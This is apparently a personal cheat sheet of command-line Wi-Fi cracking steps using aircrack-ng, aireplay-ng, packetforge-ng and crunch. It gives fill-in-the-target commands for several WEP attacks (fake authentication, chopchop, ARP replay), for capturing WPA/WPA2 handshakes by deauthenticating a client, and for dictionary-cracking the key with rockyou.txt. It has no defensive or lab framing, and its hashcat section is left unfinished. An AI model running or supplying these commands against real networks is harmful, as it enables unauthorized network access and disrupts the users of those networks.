#CRACKING

    #WEP 

            #basic
        
                    airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write sitrep-BASIC &&
                    aircrack-ng sitrep-BASIC-01.cap
    
            #fake_authentication_attack
        
                    macchanger -s wlan0 | grep "Permanent MAC:" (#COPY YOUR MAC) &&
                    aireplay-ng --fakeauth 0 -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon    
        
            #korek_chopchop_attack
        
                    airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write sitrep-CHOPCHOP &&
                    aireplay-ng --chopchop -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    packetforge-ng --arp -a (#MAC TARGET) -h (#YOUR FAKE MAC) -k 255.255.255.255 -l 255.255.255.255 -y (#replay_MMM-HHHH-YYYYDD.xor) -w sitrep-FORGED &&
                    aireplay-ng -2 -r sitrep-FORGED wlan0mon &&
                    aircrack-ng sitrep-CHOPCHOP-01.cap       
        
            #arp_request_replay_attack_(BEST_&_QUICKEST)
        
                    airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write sitrep-ARRA &&
                    aireplay-ng --fakeauth 0 -a (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    aireplay-ng --arpreplay -b (#MAC TARGET) -h (#YOUR FAKE MAC) wlan0mon &&
                    aircrack-ng sitrep-ARRA-01.cap
        
    #WPA/WPA2

        #capture_the_handshake

            #steps

                #a)save_all_the_captured_packets(airodump-ng)

                    airodump-ng wlan0mon --write sitrep-SATCP && 
                    airodump-ng wlan0mon --bssid (#MAC TARGET) -c (#channel) --write cap-HDSHK

                #b) disconnect_a_client(Deauth_atk)

                    aireplay-ng --deauth 10 -a (#MAC TARGET) -c (#MAC CLIENT TARGET) wlan0mon --write sitrep-DEAUTH
                    && ls *.cap

                #c) abort_atk

        #generating_wordlist

            #crunch_-_popular_commands

                crunch 8 8 1234567890 -o /home/blackwolf/crunch_ex.txt #exemplo
                
                #(MIN) the min num of char
                #(MAX) the max num of char
                #-T (PATTERN) can be used if u know the first of the last char of the passwd
                #-O (OUTPUT) the path of the output


        #cracking_the_key_using_Aircrack-ng(BASIC)

            #dictionary_atk

                aircrack-ng -w /usr/share/wordlists/rockyou.txt *-01.cap

        #hashcat_(GPU)

            #convert_*.cap_in_*.hccapx
                    firefox https://hashcat.net/cap2hccapx/ &

            #hashcat ????
